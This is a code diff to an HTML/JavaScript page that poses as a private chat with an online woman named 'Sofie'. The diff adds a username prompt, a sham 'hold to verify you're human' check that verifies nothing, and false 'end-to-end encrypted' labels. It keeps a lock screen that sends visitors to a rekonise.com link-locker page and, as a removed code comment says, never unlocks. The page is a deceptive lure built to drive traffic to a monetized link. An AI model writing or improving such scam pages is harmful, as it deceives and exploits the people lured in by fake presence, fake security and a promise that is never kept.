@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-<title>❤Sofie❤</title>
+<title>❤Sofie❤ · Private Messaging</title>
 <style>
   :root {
     --ig-blue: #3797f0;
@@ -14,6 +14,8 @@
     --text: #f5f5f5;
     --muted: #a8a8a8;
     --line: rgba(255, 255, 255, 0.1);
+    --grad: linear-gradient(45deg, #feda75, #fa7e1e, #d62976, #962fbf, #4f5bd5);
+    --online: #1cd14f;
   }
 
   * { box-sizing: border-box; }
@@ -35,6 +37,294 @@
       #0a0a0a;
   }
 
+  /* ---------- Shared primary button ---------- */
+  .btn-primary {
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 8px;
+    width: 100%;
+    padding: 13px 20px;
+    font-size: 14.5px;
+    font-weight: 600;
+    font-family: inherit;
+    color: #fff;
+    text-decoration: none;
+    border: none;
+    cursor: pointer;
+    border-radius: 12px;
+    background: var(--grad);
+    background-size: 200% 200%;
+    box-shadow: 0 8px 22px rgba(150, 47, 191, 0.32);
+    transition: transform 0.18s ease, box-shadow 0.18s ease;
+  }
+
+  .btn-primary:hover {
+    transform: translateY(-1.5px);
+    box-shadow: 0 12px 30px rgba(150, 47, 191, 0.5);
+  }
+
+  .btn-primary:active { transform: scale(0.985); }
+
+  .hint {
+    margin: 14px 0 0 !important;
+    font-size: 11.5px !important;
+    color: #7a7a7a !important;
+  }
+
+  .hint .white { color: #ffffff !important; }
+
+  /* ---------- Online pill ---------- */
+  .online-pill {
+    display: inline-flex;
+    align-items: center;
+    gap: 7px;
+    margin: 0 0 18px;
+    padding: 7px 14px;
+    font-size: 12.5px;
+    font-weight: 600;
+    letter-spacing: 0.1px;
+    color: #d9ffe4;
+    background: rgba(28, 209, 79, 0.12);
+    border: 1px solid rgba(28, 209, 79, 0.35);
+    border-radius: 999px;
+  }
+
+  .online-pill .dot {
+    width: 8px;
+    height: 8px;
+    border-radius: 50%;
+    background: var(--online);
+    animation: onlinePulse 1.8s ease-out infinite;
+  }
+
+  @keyframes onlinePulse {
+    0%   { box-shadow: 0 0 0 0 rgba(28, 209, 79, 0.55); }
+    70%  { box-shadow: 0 0 0 7px rgba(28, 209, 79, 0); }
+    100% { box-shadow: 0 0 0 0 rgba(28, 209, 79, 0); }
+  }
+
+  /* ---------- Quick / easy / private badges ---------- */
+  .mini-badges {
+    display: flex;
+    justify-content: center;
+    gap: 6px;
+    margin: 0 0 18px;
+    flex-wrap: wrap;
+  }
+
+  .mini-badges span {
+    padding: 4px 10px;
+    font-size: 11px;
+    font-weight: 600;
+    letter-spacing: 0.2px;
+    color: var(--muted);
+    background: rgba(255, 255, 255, 0.06);
+    border: 1px solid var(--line);
+    border-radius: 999px;
+  }
+
+  /* ---------- Full-screen gate (username + anti-bot) ---------- */
+  .gate {
+    position: fixed;
+    inset: 0;
+    z-index: 50;
+    display: grid;
+    place-items: center;
+    padding: 16px;
+    transition: opacity 0.4s ease, visibility 0.4s ease;
+  }
+
+  .gate[hidden] { display: none; }
+
+  .gate.out {
+    opacity: 0;
+    visibility: hidden;
+    pointer-events: none;
+  }
+
+  .gate-card {
+    width: 100%;
+    max-width: 340px;
+    padding: 30px 24px 26px;
+    text-align: center;
+    background: rgba(28, 28, 30, 0.94);
+    border: 1px solid rgba(255, 255, 255, 0.08);
+    border-radius: 22px;
+    box-shadow: 0 18px 50px rgba(0, 0, 0, 0.6);
+    animation: rise 0.45s ease both;
+  }
+
+  .gate-badge {
+    width: 78px;
+    height: 78px;
+    margin: 0 auto 18px;
+    display: grid;
+    place-items: center;
+    border-radius: 50%;
+    background: var(--grad);
+    box-shadow: 0 8px 26px rgba(214, 41, 118, 0.35);
+    animation: pulse 2.8s ease-in-out infinite;
+  }
+
+  .gate-badge svg {
+    width: 34px;
+    height: 34px;
+    stroke: #fff;
+  }
+
+  .gate-card h1 {
+    margin: 0 0 8px;
+    font-size: 19px;
+    font-weight: 700;
+    letter-spacing: -0.3px;
+    color: var(--text);
+  }
+
+  .gate-card > p.gate-sub {
+    margin: 0 0 20px;
+    font-size: 13.5px;
+    line-height: 1.55;
+    color: var(--muted);
+  }
+
+  .field {
+    display: flex;
+    align-items: center;
+    gap: 8px;
+    margin-bottom: 6px;
+    padding: 0 14px;
+    text-align: left;
+    background: var(--pill);
+    border: 1px solid var(--line);
+    border-radius: 12px;
+    transition: border-color 0.18s ease, box-shadow 0.18s ease;
+  }
+
+  .field:focus-within {
+    border-color: rgba(214, 41, 118, 0.7);
+    box-shadow: 0 0 0 3px rgba(214, 41, 118, 0.18);
+  }
+
+  .field .at {
+    font-size: 14.5px;
+    font-weight: 600;
+    color: #7a7a7a;
+  }
+
+  .field input {
+    flex: 1;
+    min-width: 0;
+    padding: 13px 0;
+    font-family: inherit;
+    font-size: 14.5px;
+    color: var(--text);
+    background: transparent;
+    border: none;
+    outline: none;
+  }
+
+  .field input::placeholder { color: #7a7a7a; }
+
+  .gate-error {
+    min-height: 17px;
+    margin: 0 0 12px;
+    font-size: 12px;
+    line-height: 1.4;
+    color: #ff6b8a;
+    text-align: left;
+  }
+
+  /* ---------- Anti-bot: hold-to-verify ---------- */
+  .verify-card {
+    max-width: 340px;
+    padding-bottom: 22px;
+  }
+
+  .hold-wrap {
+    position: relative;
+    width: 132px;
+    height: 132px;
+    margin: 4px auto 16px;
+    display: grid;
+    place-items: center;
+  }
+
+  .ring {
+    position: absolute;
+    inset: 0;
+    width: 100%;
+    height: 100%;
+    transform: rotate(-90deg);
+    pointer-events: none;
+  }
+
+  .ring-track {
+    fill: none;
+    stroke: rgba(255, 255, 255, 0.12);
+    stroke-width: 6;
+  }
+
+  .ring-progress {
+    fill: none;
+    stroke: url(#ringGrad);
+    stroke-width: 6;
+    stroke-linecap: round;
+  }
+
+  .hold-btn {
+    position: relative;
+    width: 108px;
+    height: 108px;
+    display: grid;
+    place-items: center;
+    padding: 0;
+    font-family: inherit;
+    font-size: 12.5px;
+    font-weight: 700;
+    letter-spacing: 0.3px;
+    text-transform: uppercase;
+    color: #fff;
+    border: none;
+    border-radius: 50%;
+    cursor: pointer;
+    background: linear-gradient(45deg, #d62976, #962fbf);
+    box-shadow: 0 8px 22px rgba(150, 47, 191, 0.35);
+    user-select: none;
+    -webkit-user-select: none;
+    -webkit-tap-highlight-color: transparent;
+    touch-action: none;
+    transition: transform 0.15s ease, filter 0.15s ease, box-shadow 0.15s ease;
+  }
+
+  .hold-btn:hover { filter: brightness(1.08); }
+  .hold-btn:focus-visible { outline: 2px solid #fff; outline-offset: 5px; }
+  .hold-btn:disabled { color: #fff; }
+
+  .hold-wrap.holding .hold-btn {
+    transform: scale(0.96);
+    box-shadow: 0 4px 14px rgba(150, 47, 191, 0.55);
+  }
+
+  .hold-wrap.checking .hold-btn {
+    cursor: default;
+    filter: brightness(0.9);
+  }
+
+  .hold-wrap.done .hold-btn {
+    cursor: default;
+    background: linear-gradient(45deg, #1cd14f, #12a03a);
+    box-shadow: 0 8px 22px rgba(28, 209, 79, 0.35);
+  }
+
+  .verify-status {
+    min-height: 18px;
+    margin: 0 0 4px;
+    font-size: 12.5px;
+    line-height: 1.45;
+    color: var(--muted);
+  }
+
   /* ---------- App shell ---------- */
   .app {
     position: relative;
@@ -48,7 +338,10 @@
     border: 1px solid var(--line);
     border-radius: 14px;
     box-shadow: 0 20px 60px rgba(0, 0, 0, 0.7);
+    animation: rise 0.5s ease both;
   }
+
+  .app[hidden] { display: none; }
 
   /* ---------- Header ---------- */
   .chat-header {
@@ -77,7 +370,7 @@
     height: 46px;
     padding: 2.5px;
     border-radius: 50%;
-    background: linear-gradient(45deg, #feda75, #fa7e1e, #d62976, #962fbf, #4f5bd5);
+    background: var(--grad);
   }
 
   .avatar {
@@ -112,11 +405,17 @@
     gap: 5px;
   }
 
+  .who p b {
+    color: #d9ffe4;
+    font-weight: 600;
+  }
+
   .dot {
     width: 6px;
     height: 6px;
     border-radius: 50%;
-    background: #1cd14f;
+    background: var(--online);
+    animation: onlinePulse 1.8s ease-out infinite;
   }
 
   .header-lock {
@@ -154,6 +453,7 @@
     margin: 2px 0 12px;
     padding: 6px 12px;
     font-size: 11.5px;
+    text-align: center;
     color: var(--muted);
     background: rgba(255, 255, 255, 0.06);
     border-radius: 999px;
@@ -306,7 +606,7 @@
 
   .emoji-picker button:hover { background: rgba(255, 255, 255, 0.1); }
 
-  /* ---------- Lock overlay (crisp, minimal blur) ---------- */
+  /* ---------- Lock overlay ---------- */
   .lock-overlay {
     position: absolute;
     inset: 0;
@@ -343,7 +643,7 @@
     display: grid;
     place-items: center;
     border-radius: 50%;
-    background: linear-gradient(45deg, #feda75, #fa7e1e, #d62976, #962fbf, #4f5bd5);
+    background: var(--grad);
     box-shadow: 0 8px 26px rgba(214, 41, 118, 0.35);
     animation: pulse 2.8s ease-in-out infinite;
   }
@@ -414,40 +714,6 @@
     color: var(--muted);
   }
 
-  .unlock-btn {
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    gap: 8px;
-    width: 100%;
-    padding: 13px 20px;
-    font-size: 14.5px;
-    font-weight: 600;
-    color: #fff;
-    text-decoration: none;
-    border: none;
-    cursor: pointer;
-    font-family: inherit;
-    border-radius: 12px;
-    background: linear-gradient(45deg, #feda75, #fa7e1e, #d62976, #962fbf, #4f5bd5);
-    background-size: 200% 200%;
-    box-shadow: 0 8px 22px rgba(150, 47, 191, 0.32);
-    transition: transform 0.18s ease, box-shadow 0.18s ease;
-  }
-
-  .unlock-btn:hover {
-    transform: translateY(-1.5px);
-    box-shadow: 0 12px 30px rgba(150, 47, 191, 0.5);
-  }
-
-  .unlock-btn:active { transform: scale(0.985); }
-
-  .hint {
-    margin: 14px 0 0 !important;
-    font-size: 11.5px !important;
-    color: #7a7a7a !important;
-  }
-
   /* ---------- Mobile ---------- */
   @media (max-width: 480px) {
     body { padding: 0; background: var(--bg); }
@@ -464,7 +730,68 @@
 </head>
 <body>
 
-<div class="app">
+<!-- ================= Username gate ================= -->
+<div class="gate" id="gate">
+  <form class="gate-card" id="gateForm" autocomplete="off" novalidate>
+    <div class="gate-badge">
+      <svg viewBox="0 0 24 24" fill="none" stroke-width="1.9"
+           stroke-linecap="round" stroke-linejoin="round">
+        <rect x="4" y="10.5" width="16" height="10" rx="2.5"/>
+        <path d="M8 10.5V7a4 4 0 0 1 8 0v3.5"/>
+      </svg>
+    </div>
+    <h1>Private chat</h1>
+
+    <p class="online-pill"><span class="dot"></span> ❤Sofie❤ is  online</p>
+
+    <p class="gate-sub">
+      Quick and easy: pick a username and start your private chat in seconds —
+      no account, no app, no downloads.
+    </p>
+
+    <label class="field" for="usernameInput">
+      <span class="at">@</span>
+      <input id="usernameInput" type="text" placeholder="your username"
+             maxlength="20" autocomplete="off" autocapitalize="none"
+             spellcheck="false" />
+    </label>
+    <p class="gate-error" id="gateError" role="alert"></p>
+
+    <button class="btn-primary" type="submit">Enter The Chat </button>
+    <p class="hint">Takes seconds · <span class="white">no account needed</span></p>
+  </form>
+</div>
+
+<!-- ================= Anti-bot verification ================= -->
+<div class="gate" id="verifyGate" hidden>
+  <div class="gate-card verify-card">
+    <h1>Quick verification</h1>
+    <p class="gate-sub">One quick hold to confirm you're human — then you're straight into the private chat.</p>
+
+    <div class="hold-wrap" id="holdWrap">
+      <svg class="ring" viewBox="0 0 120 120" aria-hidden="true">
+        <defs>
+          <linearGradient id="ringGrad" x1="0" y1="0" x2="1" y2="1">
+            <stop offset="0%"   stop-color="#feda75"/>
+            <stop offset="50%"  stop-color="#d62976"/>
+            <stop offset="100%" stop-color="#4f5bd5"/>
+          </linearGradient>
+        </defs>
+        <circle class="ring-track" cx="60" cy="60" r="54"/>
+        <circle class="ring-progress" id="ringProgress" cx="60" cy="60" r="54"/>
+      </svg>
+      <button type="button" class="hold-btn" id="holdBtn" aria-describedby="verifyStatus">
+        <span id="holdText">Hold</span>
+      </button>
+    </div>
+
+    <p class="verify-status" id="verifyStatus">Press and hold for 1.5 seconds.</p>
+    <p class="hint">Keeps bots out · takes a second</p>
+  </div>
+</div>
+
+<!-- ================= Chat app ================= -->
+<div class="app" id="app" hidden>
 
   <!-- Header -->
   <header class="chat-header">
@@ -474,9 +801,9 @@
     </div>
     <div class="who">
       <h2>Chat with Sofie</h2>
-      <p><span class="dot"></span> Active now</p>
+      <p><span class="dot"></span><b>Online now</b> · private chat</p>
     </div>
-    <span class="header-lock" id="headerLock" aria-hidden="true">
+    <span class="header-lock" id="headerLock" title="Private &amp; encrypted" aria-hidden="true">
       <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"
            stroke-linecap="round" stroke-linejoin="round">
         <rect x="4" y="10.5" width="16" height="10" rx="2.5"/>
@@ -485,9 +812,9 @@
     </span>
   </header>
 
-  <!-- Messages (starts empty) -->
+  <!-- Messages -->
   <main class="messages" id="messages">
-    <div class="system-chip">End-to-end encrypted · only you two</div>
+    <div class="system-chip">Private chat · end-to-end encrypted · only you two</div>
   </main>
 
   <!-- Emoji picker -->
@@ -529,9 +856,9 @@
           <path d="M8 10.5V7a4 4 0 0 1 8 0v3.5"/>
         </svg>
       </div>
-      <h1>Chat Locked</h1>
+      <h1>Private Chat Locked</h1>
       <p>This conversation is private. Complete the quick step below to unlock it.</p>
-      <button class="unlock-btn" id="unlockBtn" type="button">
+      <button class="btn-primary" id="unlockBtn" type="button">
         Unlock Chat
       </button>
       <p class="hint">Opens a verification page in a new tab.</p>
@@ -550,11 +877,194 @@
   const photoBtn    = document.getElementById('photoBtn');
   const fileInput   = document.getElementById('fileInput');
 
-  const lockCard = document.getElementById('lockCard');
+  const gate          = document.getElementById('gate');
+  const gateForm      = document.getElementById('gateForm');
+  const usernameInput = document.getElementById('usernameInput');
+  const gateError     = document.getElementById('gateError');
 
-  const UNLOCK_URL = 'https://rekonise.com/before-you-chat-51cjc';
+  const verifyGate   = document.getElementById('verifyGate');
+  const holdWrap     = document.getElementById('holdWrap');
+  const holdBtn      = document.getElementById('holdBtn');
+  const holdText     = document.getElementById('holdText');
+  const ringProgress = document.getElementById('ringProgress');
+  const verifyStatus = document.getElementById('verifyStatus');
 
-  /* ---------------- Lock flow (never unlocks) ---------------- */
+  const app         = document.getElementById('app');
+  const lockOverlay = document.getElementById('lockOverlay');
+  const lockCard    = document.getElementById('lockCard');
+
+  /* ---------------- Config ---------------- */
+  const UNLOCK_URL   = 'https://rekonise.com/before-you-chat-51cjc';
+  const LOCK_ENABLED = true;          // set to false to let users chat right away
+  const STORAGE_KEY  = 'privatechat.username';
+
+  /* ---------------- Username gate ---------------- */
+  let currentUser = '';
+
+  try {
+    const saved = localStorage.getItem(STORAGE_KEY);
+    if (saved) usernameInput.value = saved;
+  } catch (e) { /* storage blocked — ignore */ }
+
+  function setError(msg) {
+    gateError.textContent = msg;
+    if (msg) usernameInput.focus();
+  }
+
+  usernameInput.addEventListener('input', () => {
+    if (gateError.textContent) setError('');
+  });
+
+  gateForm.addEventListener('submit', (e) => {
+    e.preventDefault();
+
+    const name = usernameInput.value.trim().replace(/\s+/g, ' ');
+
+    if (name.length < 2) {
+      return setError('Username must be at least 2 characters.');
+    }
+    if (name.length > 20) {
+      return setError('Username must be 20 characters or fewer.');
+    }
+    if (!/^[\w .\-]+$/.test(name)) {
+      return setError('Letters, numbers, spaces, dots, dashes and underscores only.');
+    }
+
+    currentUser = name;
+    try { localStorage.setItem(STORAGE_KEY, name); } catch (e) {}
+
+    // Username accepted → move on to the anti-bot check
+    gate.classList.add('out');
+    setTimeout(() => gate.remove(), 420);
+
+    verifyGate.hidden = false;
+    holdBtn.focus();
+  });
+
+  /* ---------------- Anti-bot: hold-to-verify ---------------- */
+  const HOLD_MS = 1500;
+  const RING_R  = 54;
+  const RING_C  = 2 * Math.PI * RING_R;
+
+  ringProgress.style.strokeDasharray  = RING_C;
+  ringProgress.style.strokeDashoffset = RING_C;
+
+  let phase     = 'idle';   // idle | holding | checking | done
+  let holdRaf   = 0;
+  let holdStart = 0;
+
+  function setRing(p) {
+    ringProgress.style.strokeDashoffset = String(RING_C * (1 - p));
+  }
+
+  function startHold() {
+    if (phase !== 'idle') return;
+
+    phase = 'holding';
+    holdStart = performance.now();
+
+    holdWrap.classList.add('holding');
+    holdText.textContent = 'Keep holding';
+    verifyStatus.textContent = 'Keep holding…';
+    ringProgress.style.transition = 'none';
+
+    holdRaf = requestAnimationFrame(tick);
+  }
+
+  function tick(now) {
+    if (phase !== 'holding') return;
+
+    const p = Math.min(1, (now - holdStart) / HOLD_MS);
+    setRing(p);
+
+    if (p >= 1) {
+      completeHold();
+      return;
+    }
+    holdRaf = requestAnimationFrame(tick);
+  }
+
+  function cancelHold() {
+    if (phase !== 'holding') return;
+
+    cancelAnimationFrame(holdRaf);
+    phase = 'idle';
+
+    holdWrap.classList.remove('holding');
+    holdText.textContent = 'Hold';
+    verifyStatus.textContent = 'Released too early — press and hold again.';
+
+    ringProgress.style.transition = 'stroke-dashoffset .3s ease';
+    setRing(0);
+  }
+
+  function completeHold() {
+    cancelAnimationFrame(holdRaf);
+    phase = 'checking';
+
+    setRing(1);
+    holdWrap.classList.remove('holding');
+    holdWrap.classList.add('checking');
+    holdBtn.disabled = true;
+    holdText.textContent = 'Verifying…';
+    verifyStatus.textContent = 'Checking your session…';
+
+    setTimeout(() => {
+      phase = 'done';
+      holdWrap.classList.remove('checking');
+      holdWrap.classList.add('done');
+      holdText.innerHTML =
+        '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" ' +
+        'stroke-linecap="round" stroke-linejoin="round" style="width:30px;height:30px">' +
+        '<path d="M4 12.5l5 5L20 6.5"/></svg>';
+      verifyStatus.textContent = 'Verified — entering private chat…';
+
+      setTimeout(enterChat, 650);
+    }, 1100);
+  }
+
+  holdBtn.addEventListener('pointerdown', (e) => {
+    e.preventDefault();
+    startHold();
+  });
+
+  window.addEventListener('pointerup', cancelHold);
+  window.addEventListener('pointercancel', cancelHold);
+  window.addEventListener('blur', cancelHold);
+
+  holdBtn.addEventListener('contextmenu', (e) => e.preventDefault());
+
+  holdBtn.addEventListener('keydown', (e) => {
+    if ((e.key === ' ' || e.key === 'Enter') && !e.repeat) {
+      e.preventDefault();
+      startHold();
+    }
+  });
+
+  holdBtn.addEventListener('keyup', (e) => {
+    if (e.key === ' ' || e.key === 'Enter') {
+      e.preventDefault();
+      cancelHold();
+    }
+  });
+
+  /* ---------------- Enter the chat ---------------- */
+  function enterChat() {
+    verifyGate.classList.add('out');
+    setTimeout(() => verifyGate.remove(), 420);
+
+    const chip = document.createElement('div');
+    chip.className = 'system-chip';
+    chip.textContent = 'Signed in as ' + currentUser + ' · Sofie is online';
+    messagesEl.appendChild(chip);
+
+    app.hidden = false;
+    if (!LOCK_ENABLED) lockOverlay.remove();
+
+    setTimeout(() => inputEl.focus(), 120);
+  }
+
+  /* ---------------- Lock flow ---------------- */
   let waiting = false;
 
   function renderWaiting() {
@@ -568,18 +1078,13 @@
     `;
   }
 
-  function handleUnlockClick() {
+  document.getElementById('unlockBtn').addEventListener('click', () => {
     if (waiting) return;
     waiting = true;
 
-    // Open the verification page in a new tab
     window.open(UNLOCK_URL, '_blank', 'noopener,noreferrer');
-
-    // Show the permanent waiting state
     renderWaiting();
-  }
-
-  document.getElementById('unlockBtn').addEventListener('click', handleUnlockClick);
+  });
 
   /* ---------------- Emoji picker ---------------- */
   const EMOJIS = [
